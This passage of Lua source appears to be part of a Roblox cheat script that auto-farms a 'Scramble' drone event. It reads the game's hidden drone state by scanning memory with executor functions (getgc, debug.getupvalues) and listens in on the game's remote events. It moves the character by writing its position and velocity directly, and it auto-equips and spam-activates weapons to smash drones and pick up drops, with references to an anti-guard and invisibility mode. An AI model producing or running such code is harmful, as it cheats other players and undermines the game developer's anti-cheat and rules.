			Vector3.new(2700, 90, -370),
			Vector3.new(3400, 90, -365),
			Vector3.new(4100, 90, -360),
			Vector3.new(4800, 90, -370),
			Vector3.new(5500, 90, -360),
			Vector3.new(5900, 90, -365),
		}

		local scrambleDroneTargets = {}
		local scrambleMoveState = { Link = nil, Goal = nil, Look = nil, Character = nil }
		local userId = localPlayer.UserId
		local scrambleDroneLabels = {}

		for _, droneInfo in ipairs({
			{ Label = "Scrap Drone", Tier = "ScrapDrone" },
			{ Label = "Reactor Drone", Tier = "ReactorDrone" },
			{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
		}) do
			scrambleDroneLabels[#scrambleDroneLabels + 1] = droneInfo.Label
		end

		local scrambleDroneTiers = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
		local scrambleTargetingMode = ({ "Nearest", "Rare First", "Most HP First" })[1]
		local scrambleMoveMode = ({ "Tween", "Teleport" })[1]
		local scrambleHoverHeight = 110
		local scramblePatrolRadius = 1.5
		local scrambleTryTeleportCount = 0
		local scrambleLastTeleportTime = -math.huge

		local function isMine(upsertObj)
			local ownerId = type(upsertObj) == "table" and tonumber(upsertObj.OwnerUserId) or nil
			return ownerId == nil or ownerId == userId
		end

		local function getPosFromCFrameOrVector3(val)
			if typeof(val) == "CFrame" then
				return val.Position
			end

			if typeof(val) == "Vector3" then
				return val
			end
			return nil
		end

		local function bindScrambleRemoteEvent(eventName, callback)
			local remoteEvent = networking:FindFirstChild(eventName)
			if not remoteEvent or not remoteEvent:IsA("RemoteEvent") then
				return
			end

			local connection = remoteEvent.OnClientEvent:Connect(function(...)
				pcall(callback, ...)
			end)

			trackCleanup(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end

		bindScrambleRemoteEvent("RE/Scramble/Drones", function(payload)
			if type(payload) ~= "table" then
				return
			end
			local pairsIter = pairs
			local upserts = type(payload.Upserts) == "table" and payload.Upserts or {}

			for _, upsert in pairsIter(upserts) do
				if type(upsert) == "table" and upsert.Id ~= nil and isMine(upsert) then
					local id = tostring(upsert.Id)
					local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
					local targetData = scrambleWantedRewards[id] or {}
					targetData.Id = id
					targetData.Position = getPosFromCFrameOrVector3(upsert.CFrame) or targetData.Position
					targetData.Health = tonumber(upsert.Health) or targetData.Health or 1
					targetData.Tier = tostring(attributes.ScrambleTier or targetData.Tier or "")
					targetData.Area = tostring(attributes.ScrambleArea or targetData.Area or "")
					targetData.Seen = os.clock()
					scrambleWantedRewards[id] = targetData
				end
			end

			local pairsIterRemoved = pairs
			local removed = type(payload.Removed) == "table" and payload.Removed or {}

			for k, removedId in pairsIterRemoved(removed) do
				scrambleWantedRewards[tostring(type(removedId) == "string" and removedId or k)] = nil
			end
		end)

		bindScrambleRemoteEvent("RE/Scramble/Effect", function(effectType, cframe, data)
			if effectType ~= "Hit" or type(data) ~= "table" or data.DroneId == nil then
				return
			end
			local targetData = scrambleWantedRewards[tostring(data.DroneId)]
			if not targetData then
				return
			end
			targetData.Position = getPosFromCFrameOrVector3(cframe) or targetData.Position
			targetData.Health = (tonumber(targetData.Health) or 1) - (tonumber(data.Amount) or 1)

			if type(data.Motion) == "string" and string.find(data.Motion, "\"Death\"", 1, true) then
				targetData.Health = 0
			end

			if targetData.Health <= 0 then
				scrambleWantedRewards[targetData.Id] = nil
			end
		end)

		bindScrambleRemoteEvent("RE/Scramble/Drops", function(dropsArray)
			local pairsIter = pairs
			local drops = type(dropsArray) == "table" and dropsArray or {}

			for _, dropData in pairsIter(drops) do
				if type(dropData) == "table" and dropData.Id ~= nil and isMine(dropData) then
					local pos = getPosFromCFrameOrVector3(dropData.Position) or getPosFromCFrameOrVector3(dropData.Origin)

					if pos then
						scrambleClaimedParts[tostring(dropData.Id)] = {
							Position = pos,
							Radius = tonumber(dropData.Radius) or 6,
							ExpiresAt = tonumber(dropData.ExpiresAt),
							Kind = dropData.Kind,
						}
					end
				end
			end
		end)

		bindScrambleRemoteEvent("RE/Scramble/State", function(statePayload)
			if type(statePayload) ~= "table" then
				return
			end

			if statePayload.Patch == true and type(scrambleSnapshot) == "table" then
				for k, v in pairs(statePayload) do
					if k ~= "Patch" then
						scrambleSnapshot[k] = v
					end
				end
			elseif type(statePayload.State) == "table" then
				scrambleSnapshot = statePayload
			end

			scrambleSnapshotTime = os.clock()
		end)

		bindScrambleRemoteEvent("RE/Scramble/RemoveDrops", function(dropsArray)
			local pairsIter = pairs
			local drops = type(dropsArray) == "table" and dropsArray or {}

			for k, removedId in pairsIter(drops) do
				local claimedParts = scrambleClaimedParts
				local tostringFn = tostring
				removedId = type(removedId) == "string" and removedId or k
				claimedParts[tostringFn(removedId)] = nil
			end
		end)

		local function getPersonalDroneModel(droneId)
			local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
			return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. droneId) or nil
		end

		local scrambleDronesGcCache = nil
		local scrambleGcScanTime = 0

		local function scanForPersonalDrones()
			if scrambleDronesGcCache and next(scrambleDronesGcCache) ~= nil then
				return scrambleDronesGcCache
			end
			scrambleDronesGcCache = nil
			if os.clock() < scrambleGcScanTime or type(getgc) ~= "function" or not fn12() then
				return nil
			end
			scrambleGcScanTime = os.clock() + 15

			for _, obj in ipairs(getgc(false)) do
				if type(obj) == "function" and islclosure(obj) then
					local ok, result = pcall(debug.info, obj, "s")

					if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
						local ok2, upvalues = pcall(debug.getupvalues, obj)

						if ok2 and type(upvalues) == "table" then
							for _, upval in pairs(upvalues) do
								if type(upval) == "table" then
									local key, val = next(upval)
									if type(val) == "table" and val.OwnerUserId ~= nil and val.CFrame ~= nil then
										scrambleDronesGcCache = upval
										return upval
									end
								end
							end

							continue
						end
					end
				end
			end

			return nil
		end

		local function updateDroneStatesFromGc()
			local gcData = scanForPersonalDrones()
			if not gcData then
				return
			end

			for k, droneInfo in pairs(gcData) do
				if type(droneInfo) == "table" and isMine(droneInfo) then
					local droneId = tostring(droneInfo.Id or k)
					local attributes = type(droneInfo.Attributes) == "table" and droneInfo.Attributes or {}
					local wantedDrone = scrambleWantedRewards[droneId]
					local health = tonumber(droneInfo.Health)

					if not wantedDrone then
						wantedDrone = { Id = droneId, Health = health or 1 }
						scrambleWantedRewards[droneId] = wantedDrone
					elseif health then
						wantedDrone.Health = math.min(health, tonumber(wantedDrone.Health) or health)
					end

					wantedDrone.Position = getPosFromCFrameOrVector3(droneInfo.CFrame) or wantedDrone.Position
					wantedDrone.Tier = tostring(attributes.ScrambleTier or wantedDrone.Tier or "")
					wantedDrone.Area = tostring(attributes.ScrambleArea or wantedDrone.Area or "")

					if attributes.DroneState == "Death" then
						wantedDrone.Health = 0
					end
				end
			end

			for k in pairs(scrambleWantedRewards) do
				if gcData[k] == nil then
					scrambleWantedRewards[k] = nil
				end
			end
		end

		local function updateDroneStatesFromWorkspace()
			pcall(updateDroneStatesFromGc)
			local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
			if not scrambleLocalVisuals then
				return
			end

			for _, droneModel in ipairs(scrambleLocalVisuals:GetChildren()) do
				local droneIdAttr = droneModel:GetAttribute("ScrambleDroneId")

				if droneModel:IsA("Model") and droneIdAttr ~= nil and string.sub(droneModel.Name, 1, 14) == "PersonalDrone_" then
					local droneId = tostring(droneIdAttr)

					if droneModel:GetAttribute("DroneState") == "Death" then
						scrambleWantedRewards[droneId] = nil
					elseif not scrambleWantedRewards[droneId] then
						local ok, result = pcall(droneModel.GetPivot, droneModel)

						scrambleWantedRewards[droneId] = {
							Id = droneId,
							Position = ok and result.Position or nil,
							Health = tonumber(droneModel:GetAttribute("Health")) or 1,
							Tier = tostring(droneModel:GetAttribute("ScrambleTier") or ""),
							Area = tostring(droneModel:GetAttribute("ScrambleArea") or ""),
							Seen = os.clock(),
						}
					end
				end
			end
		end

		local function getDroneVisualPosition(droneData)
			local droneModel = getPersonalDroneModel(droneData.Id)
			local hitbox = droneModel and droneModel:FindFirstChild("Hitbox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position
			end

			if droneModel and droneModel.PrimaryPart then
				return droneModel.PrimaryPart.Position
			end
			return droneData.Position
		end

		local function getValidDrones()
			local validDrones = {}
			local now = os.clock()

			for k, droneData in pairs(scrambleWantedRewards) do
				local isValid = droneData.Tier == nil or droneData.Tier == "" or scrambleDroneTiers[droneData.Tier] == true

				if isValid then
					isValid = (tonumber(droneData.Health) or 0) > 0
				end

				isValid = isValid and droneData.Position
				local isReadyToTarget

				if isValid then
					isReadyToTarget = (scrambleDroneTargets[k] or 0) <= now
				else
					isReadyToTarget = isValid
				end

				if isReadyToTarget then
					validDrones[#validDrones + 1] = droneData
				end
			end

			return validDrones
		end

		local function findBestDroneTarget()
			local rootPart = getRootPart()
			if not rootPart then
				return nil
			end
			local bestScore = math.huge
			local bestDrone = nil

			for _, droneData in ipairs(getValidDrones()) do
				local dist = ((getDroneVisualPosition(droneData) or droneData.Position) - rootPart.Position).Magnitude
				local targetingMode = scrambleTargetingMode
				local score

				if targetingMode == "Rare First" then
					if droneData.Tier == "AugmentedDrone" then
						score = dist - 200000
					elseif droneData.Tier ~= "ReactorDrone" then
						score = dist
					else
						score = dist - 100000
					end
				elseif targetingMode == "Most HP First" then
					score = dist - (tonumber(droneData.Health) or 0) * 100000
				else
					score = dist
				end

				if score < bestScore then
					bestScore = score
					bestDrone = droneData
				end
			end

			return bestDrone
		end

		local function findBestDropTarget()
			local rootPart = getRootPart()
			if not rootPart then
				return nil, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local bestScore = math.huge
			local bestDropId = nil
			local bestDropData = nil

			for dropId, dropData in pairs(scrambleClaimedParts) do
				if dropData.ExpiresAt and dropData.ExpiresAt < serverTimeNow then
					scrambleClaimedParts[dropId] = nil
				else
					local dist = (dropData.Position - rootPart.Position).Magnitude
					local score

					if dropData.Kind == "Part" then
						score = dist - 100000
					else
						score = dist
					end

					if score < bestScore then
						bestScore = score
						bestDropId = dropId
						bestDropData = dropData
					end
				end
			end

			return bestDropId, bestDropData
		end

		scrambleMoveStop = function()
			if not scrambleMoveState.Link then
				if scrambleMoveState.SwapWait then
					scrambleMoveState.SwapWait = nil
					chilliState.Shield("scramble", false)
				end
				return
			end

			scrambleMoveState.Link:Disconnect()
			scrambleMoveState.Link = nil
			scrambleMoveState.Goal = nil
			scrambleMoveState.Look = nil
			scrambleMoveState.Character = nil
			scrambleMoveState.Track = nil
			scrambleMoveState.Dir = nil
			scrambleMoveState.Last = nil
			scrambleMoveState.LastAt = nil
			scrambleMoveState.Vel = nil
			chilliState.Driving = math.max(0, chilliState.Driving - 1)
			chilliState.Shield("scramble", false)
		end
		fn32 = scrambleMoveStop

		trackCleanup(scrambleMoveStop)

		local function scrambleMoveStart(goalPos, lookPos, trackFn)
			if trackFn ~= scrambleMoveState.Track then
				scrambleMoveState.Last = nil
				scrambleMoveState.LastAt = nil
				scrambleMoveState.Vel = nil
			end

			scrambleMoveState.Goal = goalPos
			scrambleMoveState.Look = lookPos
			scrambleMoveState.Track = trackFn
			local character = localPlayer.Character

			if scrambleMoveState.Link and scrambleMoveState.Character ~= character then
				scrambleMoveStop()
				scrambleMoveState.Goal = goalPos
				scrambleMoveState.Look = lookPos
				scrambleMoveState.Track = trackFn
			end

			if scrambleMoveState.Link or not character then
				return
			end

			if not chilliState.Swapped() then
				chilliState.Shield("scramble", true)
				scrambleMoveState.SwapWait = scrambleMoveState.SwapWait or os.clock() + 6
				local swapWait = scrambleMoveState.SwapWait
				if os.clock() < swapWait then
					scrambleStatusStr = "Waiting for the character to settle"
					return
				end
			end

			if scrambleMoveState.SwapWait then
				scrambleMoveState.SwapWait = nil
			else
				chilliState.Shield("scramble", true)
			end

			scrambleMoveState.Character = character
			chilliState.Driving = chilliState.Driving + 1

			scrambleMoveState.Link = RunService.Heartbeat:Connect(function(deltaTime)
				local rootPart = chilliState.Root()
				local currentGoal = scrambleMoveState.Goal
				if not rootPart or not currentGoal or rootPart.Parent ~= scrambleMoveState.Character or chilliState.AntiGuard.Busy or chilliState.Movement.Owner ~= "scramble" then
					return
				end
				local position = rootPart.Position

				if scrambleMoveState.Track then
					local ok, trackPos = pcall(scrambleMoveState.Track)

					if ok and typeof(trackPos) == "Vector3" then
						local now = os.clock()

						if not scrambleMoveState.Last or not scrambleMoveState.LastAt then
							scrambleMoveState.Last = trackPos
							scrambleMoveState.LastAt = now
						elseif (trackPos - scrambleMoveState.Last).Magnitude > 0.01 then
							local dt = math.max(now - scrambleMoveState.LastAt, 0.0041666666666666666)
							local velTarget = (trackPos - scrambleMoveState.Last) / dt

							if velTarget.Magnitude < 400 then
								local lerpAlpha = math.clamp(dt * 12, 0.2, 0.8)
								scrambleMoveState.Vel = scrambleMoveState.Vel and scrambleMoveState.Vel:Lerp(velTarget, lerpAlpha) or velTarget
							end

							scrambleMoveState.Last = trackPos
							scrambleMoveState.LastAt = now
						elseif now - scrambleMoveState.LastAt > 0.25 and scrambleMoveState.Vel then
							scrambleMoveState.Vel = scrambleMoveState.Vel:Lerp(Vector3.zero, math.clamp(deltaTime * 6, 0, 1))
						end

						local currentVel = scrambleMoveState.Vel or Vector3.zero
						local currentLook = scrambleMoveState.Last + currentVel * (math.clamp(now - scrambleMoveState.LastAt, 0, 0.25) + 0.1)
						local lookDir2D = Vector3.new(position.X - currentLook.X, 0, position.Z - currentLook.Z)

						if lookDir2D.Magnitude > 0.5 then
							local lookUnit = lookDir2D.Unit
							local lerpAlpha = math.clamp(deltaTime * 5, 0, 1)
							local newDir = scrambleMoveState.Dir and scrambleMoveState.Dir:Lerp(lookUnit, lerpAlpha) or lookUnit
							scrambleMoveState.Dir = newDir.Magnitude > 0.01 and newDir.Unit or lookUnit
						end

						currentGoal = currentLook + (scrambleMoveState.Dir or Vector3.new(0, 0, 1)) * scrambleHitboxRadius + Vector3.new(0, -1, 0)
						scrambleMoveState.Goal = currentGoal
						scrambleMoveState.Look = currentLook

						if (currentGoal - position).Magnitude <= 40 then
							local dt = math.max(deltaTime, 0.0041666666666666666)
							local moveVel = currentVel + (currentGoal - position) / math.max(0.1, dt)
							local maxVel = math.max(400, currentVel.Magnitude + 80)

							if maxVel < moveVel.Magnitude then
								moveVel = moveVel.Unit * maxVel
							end

							local assemblyLinearVelocity = moveVel + Vector3.new(0, workspace.Gravity * dt * 0.5, 0)
							local orientDir = Vector3.new(currentLook.X - position.X, 0, currentLook.Z - position.Z)

							pcall(function()
								if orientDir.Magnitude > 0.05 then
									rootPart.CFrame = CFrame.lookAt(position, position + orientDir.Unit)
								end

								rootPart.AssemblyLinearVelocity = assemblyLinearVelocity
								rootPart.AssemblyAngularVelocity = Vector3.zero
							end)

							return
						end
					end
				end

				local travelPos

				if Vector3.new(currentGoal.X - position.X, 0, currentGoal.Z - position.Z).Magnitude > 250 then
					local safeY = math.max(98, currentGoal.Y)
					travelPos = position.Y < safeY - 2 and Vector3.new(position.X, safeY, position.Z) or Vector3.new(currentGoal.X, safeY, currentGoal.Z)
				else
					travelPos = currentGoal
				end

				local offset = travelPos - position
				local stepDist = scrambleTravelSpeed * deltaTime
				travelPos = offset.Magnitude <= stepDist and travelPos or position + offset.Unit * stepDist
				local finalLook = scrambleMoveState.Look or currentGoal
				local orientDir = Vector3.new(finalLook.X - travelPos.X, 0, finalLook.Z - travelPos.Z)
				local cframe = orientDir.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, orientDir.Unit) or rootPart.CFrame.Rotation

				pcall(function()
					rootPart.CFrame = CFrame.new(travelPos) * cframe
					rootPart.AssemblyLinearVelocity = Vector3.zero
					rootPart.AssemblyAngularVelocity = Vector3.zero
				end)
			end)
		end

		local function isSlapTool(tool)
			if typeof(tool) ~= "Instance" or not tool:IsA("Tool") then
				return false
			end
			local gearName = tool:GetAttribute("GearName")
			local gears = gameModules.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local gearInfo = type(gearName) == "string" and type(directory) == "table" and directory[gearName] or nil
			return type(gearInfo) == "table" and (gearInfo.ToolController == "Slap" or gearInfo.SlapPower ~= nil)
		end

		local function isScramblerTool(tool)
			if typeof(tool) ~= "Instance" or not tool:IsA("Tool") then
				return false
			end

			if tostring(tool:GetAttribute("ItemType")) ~= "Gear" then
				return false
			end
			local gearName = tostring(tool:GetAttribute("GearName") or "")
			if gearName == "" then
				return false
			end
			return string.find(string.lower(gearName), "scrambler", 1, true) ~= nil
		end

		local function getCharAndBackpack()
			return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
		end

		local function getBestScrambleWeapon()
			local character, backpack = getCharAndBackpack()
			local bestBat = nil
			local scramblerTool = nil
			local secondaryBat = nil

			for _, container in ipairs({ character, backpack }) do
				if container then
					for _, child in ipairs(container:GetChildren()) do
						if scrambleEquipState.Valid(child) then
							if isScramblerTool(child) then
								scramblerTool = scramblerTool or child
							elseif chilliState.IsBatTool(child) and (bestBat == nil or not chilliState.IsBatTool(bestBat)) then
								if secondaryBat then
									bestBat = child
								else
									secondaryBat = bestBat
									bestBat = child
								end
							elseif bestBat == nil then
								bestBat = child
							elseif secondaryBat == nil then
								secondaryBat = child
							end
						end
					end
				end
			end

			return bestBat, scramblerTool or secondaryBat
		end
		local getScrambleWeapons = getBestScrambleWeapon

		scrambleEquipState.Valid = function(tool)
			if typeof(tool) ~= "Instance" or not tool:IsA("Tool") then
				return false
			end
			return chilliState.IsBatTool(tool) or isSlapTool(tool) or isScramblerTool(tool)
		end

		scrambleEquipState.Owned = function(tool)
			if typeof(tool) ~= "Instance" or not tool:IsA("Tool") then
				return false
			end
			local character, backpack = getCharAndBackpack()
			local parent = tool.Parent
			local hasParent = parent ~= nil
			local isOwned

			if hasParent then
				isOwned = parent == character or parent == backpack
			else
				isOwned = hasParent
			end

			return isOwned
		end

		scrambleEquipState.Name = function(tool)
			if isScramblerTool(tool) then
				return "The Scrambler"
			end
			return tostring(tool:GetAttribute("GearName") or tool.Name)
		end

		scrambleEquipState.Put = function(tool, humanoid, character)
			local equipAt = scrambleEquipState.EquipAt
			if os.clock() - equipAt < 0.4 then
				return false
			end
			scrambleEquipState.EquipAt = os.clock()

			pcall(function()
				humanoid:EquipTool(tool)
			end)

			if tool.Parent ~= character then
				pcall(function()
					tool.Parent = character
				end)
			end

			return tool.Parent == character
		end

		local function scrambleEquipTool()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if not character or not humanoid or humanoid.Health <= 0 then
				return nil, false
			end
			local activeTool = character:FindFirstChildWhichIsA("Tool")

			if activeTool ~= nil and scrambleEquipState.Valid(activeTool) then
				scrambleEquipState.Tool = activeTool
				scramblePhaseStr = scrambleEquipState.Name(activeTool)
				return activeTool, true
			end

			if not scrambleEquipState.Owned(scrambleEquipState.Tool) then
				local bestBat, scramblerTool = getBestScrambleWeapon()
				scrambleEquipState.Tool = bestBat or scramblerTool
			end

			local toolToEquip = scrambleEquipState.Tool
			if not toolToEquip then
				scramblePhaseStr = ""
				return nil, false
			end
			scramblePhaseStr = scrambleEquipState.Name(toolToEquip)
			scrambleEquipState.Put(toolToEquip, humanoid, character)
			return toolToEquip, toolToEquip.Parent == character
		end

		local function scrambleUseTool()
			local tool, isEquipped = scrambleEquipTool()

			if tool and isEquipped then
				if scrambleInvisState then
					pcall(function()
						tool:Activate()
					end)

					task.defer(function()
						pcall(function()
							tool:Deactivate()
						end)
					end)
				else
					pcall(function()
						tool:Deactivate()
						tool:Activate()
					end)
				end
			end

			return tool ~= nil
		end

		local function clickTool(tool)
			pcall(function()
				tool:Activate()
			end)

			task.defer(function()
				pcall(function()
					tool:Deactivate()
				end)
			end)
		end

		scrambleSwapState.SpamUntil = 0
		scrambleSwapState.List = {}
		scrambleSwapState.Dirty = true
		scrambleSwapState.BuiltAt = 0
		scrambleSwapState.NextBag = 0
		scrambleSwapState.Links = {}

		scrambleSwapState.Click = function(tool)
			pcall(tool.Deactivate, tool)
			pcall(tool.Activate, tool)
		end

		scrambleSwapState.Rebuild = function()
			scrambleSwapState.Dirty = false
			scrambleSwapState.BuiltAt = os.clock()
			table.clear(scrambleSwapState.List)
			local character, backpack = getCharAndBackpack()

			for _, container in ipairs({ character, backpack }) do
				if container then
					for _, child in ipairs(container:GetChildren()) do
						if scrambleEquipState.Valid(child) then
							scrambleSwapState.List[#scrambleSwapState.List + 1] = child
						end
					end
				end
			end
		end

		scrambleSwapState.Beat = RunService.Heartbeat:Connect(function()
			local now = os.clock()
			if scrambleSwapState.SpamUntil <= now then
				return
			end

			if scrambleSwapState.Dirty or now - scrambleSwapState.BuiltAt > 1 then
				scrambleSwapState.Rebuild()
			end

			local character = localPlayer.Character
			local isNextBag = now >= scrambleSwapState.NextBag

			if isNextBag then
				scrambleSwapState.NextBag = now + 0.25
			end

			for _, tool in ipairs(scrambleSwapState.List) do
				local parent = tool.Parent

				if parent == character then
					scrambleSwapState.Click(tool)
				elseif isNextBag and parent ~= nil then
					scrambleSwapState.Click(tool)
				end
			end
		end)

		scrambleSwapState.Unwatch = function()
			for i = #scrambleSwapState.Links, 1, -1 do
				pcall(function()
					scrambleSwapState.Links[i]:Disconnect()
				end)

				scrambleSwapState.Links[i] = nil
			end
		end

		scrambleSwapState.Watch = function(character)
			scrambleSwapState.Unwatch()
			scrambleSwapState.Dirty = true
			if not character then
				return
			end

			scrambleSwapState.Links[#scrambleSwapState.Links + 1] = character.ChildAdded:Connect(function(child)
				if not child:IsA("Tool") then
					return
				end
				scrambleSwapState.Dirty = true
				local spamUntil = scrambleSwapState.SpamUntil

				if os.clock() < spamUntil and scrambleEquipState.Valid(child) then
					scrambleSwapState.Click(child)
					task.defer(scrambleSwapState.Click, child)
				end
			end)

			scrambleSwapState.Links[#scrambleSwapState.Links + 1] = character.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					scrambleSwapState.Dirty = true
				end
			end)

			task.defer(function()
				local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:WaitForChild("Backpack", 5)

				if backpack and localPlayer.Character == character then
					scrambleSwapState.Links[#scrambleSwapState.Links + 1] = backpack.ChildAdded:Connect(function()
						scrambleSwapState.Dirty = true
					end)

					scrambleSwapState.Links[#scrambleSwapState.Links + 1] = backpack.ChildRemoved:Connect(function()
						scrambleSwapState.Dirty = true
					end)
				end
			end)
		end

		scrambleSwapState.Watch(localPlayer.Character)
		scrambleSwapState.CharLink = localPlayer.CharacterAdded:Connect(scrambleSwapState.Watch)

		trackCleanup(function()
			scrambleSwapState.SpamUntil = 0
			scrambleSwapState.Unwatch()

			for _, linkName in ipairs({ "Beat", "CharLink" }) do
				if scrambleSwapState[linkName] then
					pcall(function()
						scrambleSwapState[linkName]:Disconnect()
					end)

					scrambleSwapState[linkName] = nil
				end
			end
		end)

		local function scrambleSwapWeapons()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if not character or not humanoid or humanoid.Health <= 0 then
				return false
			end
			local primary, secondary = getBestScrambleWeapon()
			if not primary or not secondary then
				return scrambleUseTool()
			end
			local weapons = { primary, secondary }
			local swapDelays = { 0.3, 0.4 }
			scrambleSwapState.Index = scrambleSwapState.Index or 1
			local activeWeapon = weapons[scrambleSwapState.Index]

			if scrambleSwapState.Tool ~= activeWeapon then
				scrambleSwapState.Tool = activeWeapon
				scrambleSwapState.Since = os.clock()
			end

			local isEquipped = activeWeapon.Parent == character

			if isEquipped then
				isEquipped = os.clock() - scrambleSwapState.Since >= swapDelays[scrambleSwapState.Index]
			end

			if isEquipped then
				scrambleSwapState.Index = scrambleSwapState.Index == 1 and 2 or 1
				activeWeapon = weapons[scrambleSwapState.Index]
				scrambleSwapState.Tool = activeWeapon
				scrambleSwapState.Since = os.clock()
			end

			scrambleEquipState.Tool = activeWeapon
			scramblePhaseStr = scrambleEquipState.Name(activeWeapon)

			if activeWeapon.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(activeWeapon)
				end)

				if activeWeapon.Parent ~= character then
					pcall(function()
						activeWeapon.Parent = character
					end)
				end

				scrambleSwapState.Since = os.clock()

				if activeWeapon.Parent == character then
					clickTool(activeWeapon)
					task.defer(clickTool, activeWeapon)
				end

				return true
			end

			clickTool(activeWeapon)
			return true
		end

		local function scrambleCollectDrops(isCancelledFn, centerPos, maxRadius)
			local now = os.clock()
			local timeout = now + 3

			while os.clock() < timeout and not isCancelledFn() do
				local dropId, dropData = findBestDropTarget()
				local shouldStop = not dropData

				if not shouldStop then
					if centerPos then
						shouldStop = (dropData.Position - centerPos).Magnitude > (maxRadius or 40)
					else
						shouldStop = centerPos
					end
				end

				if shouldStop then
					if centerPos and os.clock() - now < 1.2 then
						task.wait(0.1)
						continue
					end
					return
				end

				if isInsideBase() and not isInsideBase(dropData.Position) then
					scrambleMoveStop()
					scrambleStatusStr = "Leaving the base through the safe zone"
					if not scrambleMoveTo(dropData.Position + Vector3.new(0, 2.5, 0), isCancelledFn, 6) then
						return
					end
					continue
				end

				scrambleStatusStr = dropData.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
				scrambleMoveStart(dropData.Position + Vector3.new(0, 2.5, 0), dropData.Position)
				local giveUpTime = os.clock() + 2.5

				while scrambleClaimedParts[dropId] and os.clock() < giveUpTime and not isCancelledFn() do
					task.wait(0.1)
				end

				scrambleClaimedParts[dropId] = nil
				timeout = os.clock() + 1.2
			end
		end

		local function scrambleSmashDrone(droneTarget, isCancelledFn)
			local startTime = os.clock()
			local targetHealth = tonumber(droneTarget.Health) or 0
			local stuckTimer = nil
			local attackTimer = nil
			local getDroneHitboxPos = nil
			local warnedNoBat = false

			while not isCancelledFn() do
				local droneData = scrambleWantedRewards[droneTarget.Id]
				local isDead = not droneData

				if not isDead then
					isDead = (tonumber(droneData.Health) or 0) <= 0
				end

				if isDead then
					return true
				end
				local droneVisual = getPersonalDroneModel(droneTarget.Id)
				if droneVisual and droneVisual:GetAttribute("DroneState") == "Death" then
					scrambleWantedRewards[droneTarget.Id] = nil
					return true
				end
				local rootPart = getRootPart()
				local isNearTarget = rootPart ~= nil and droneData.Position ~= nil

				if isNearTarget then
					isNearTarget = (rootPart.Position - (getDroneVisualPosition(droneData) or droneData.Position)).Magnitude <= 30
				end

				if isNearTarget and not droneVisual then
					local now2 = stuckTimer or os.clock()
					if os.clock() - now2 > 1.5 then
						scrambleWantedRewards[droneTarget.Id] = nil
						return false
					end
					stuckTimer = now2
				else
					stuckTimer = nil
				end

				local currentHealth = tonumber(droneData.Health) or 0

				if currentHealth ~= targetHealth then
					attackTimer = nil
					targetHealth = currentHealth
				end

				if 20 < os.clock() - startTime then
					scrambleDroneCooldowns[droneTarget.Id] = os.clock() + 30
					return false
				end
				local position = getDroneVisualPosition(droneData) or droneData.Position
				local rootPart2 = getRootPart()
				if not rootPart2 then
					return false
				end

				if isInsideBase() and not isInsideBase(position) then
					scrambleMoveStop()
					scrambleStatusStr = "Leaving the base through the safe zone"
					if not scrambleMoveTo(position, isCancelledFn, 12) then
						return false
					end

					if isCancelledFn() then
						return false
					end
				end

				if not getDroneHitboxPos then
					local cachedVisual = nil
					local cachedHitbox = nil

					getDroneHitboxPos = function()
						local currentData = scrambleWantedRewards[droneTarget.Id]
						if not currentData then
							return nil
						end

						if not cachedVisual or not cachedVisual.Parent then
							cachedVisual = getPersonalDroneModel(droneTarget.Id)
							local hitbox = cachedVisual and cachedVisual:FindFirstChild("Hitbox")
							cachedHitbox = hitbox and hitbox:IsA("BasePart") and hitbox or cachedVisual and cachedVisual.PrimaryPart or nil
						end

						if cachedHitbox and cachedHitbox.Parent then
							return cachedHitbox.Position
						end
						return currentData.Position
					end
				end

				if scrambleInvisState then
					scrambleMoveStart(position + Vector3.new(0, -1, 16), position, getDroneHitboxPos)
				else
					scrambleMoveStart(position + Vector3.new(0, -1, 5), position)
				end

				if (rootPart2.Position - position).Magnitude <= 60 and not scrambleInvisState then
					scrambleEquipTool()
				end

				local dist = (rootPart2.Position - position).Magnitude
				local attackDist = false

				if scrambleInvisState then
					attackDist = math.max(12, scrambleHitboxRadius + 7)
				end

				local inAttackRange = dist <= (attackDist or 12)

				if inAttackRange then
					if scrambleInvisState then
						scrambleSwapState.SpamUntil = os.clock() + 0.2
					end

					local now2 = attackTimer or os.clock()
					if os.clock() - now2 > 8 then
						scrambleDroneCooldowns[droneTarget.Id] = os.clock() + 30
						return false
					end
					local successHit = false

					if scrambleInvisState then
						successHit = scrambleSwapWeapons()
					end

					if successHit or not scrambleInvisState and scrambleUseTool() then
						scrambleStatusStr = string.format("Smashing %s  %d HP", droneData.Tier ~= "" and droneData.Tier or "drone", math.max(0, tonumber(droneData.Health) or 0))
						attackTimer = now2
					elseif not warnedNoBat then
						scrambleStatusStr = "No bat found, get any bat to smash drones"
						warnedNoBat = true
						attackTimer = now2
					else
						attackTimer = now2
					end
				else
					scrambleStatusStr = "Flying to a drone"
				end

				local wait = task.wait
				local isFastWait = false

				if scrambleInvisState then
					isFastWait = inAttackRange
				end

				wait(isFastWait and 0.03 or 0.1)
			end

			return false
		end

		local function scramblePatrolForDrones(isCancelledFn)
			for _, patrolPoint in ipairs(scramblePatrolPoints) do
				if isCancelledFn() then
					return false
				end
				scrambleStatusStr = "Looking for drones"
				scrambleMoveStart(patrolPoint)
				local timeout = os.clock() + 12

				while os.clock() < timeout and not isCancelledFn() do
					updateDroneStatesFromWorkspace()
					if #getValidDrones() > 0 then
						return true
					end

					if chilliState.DistanceTo(patrolPoint) < 8 then
						break
					end
					task.wait(0.2)
				end
			end

			return #getValidDrones() > 0
		end

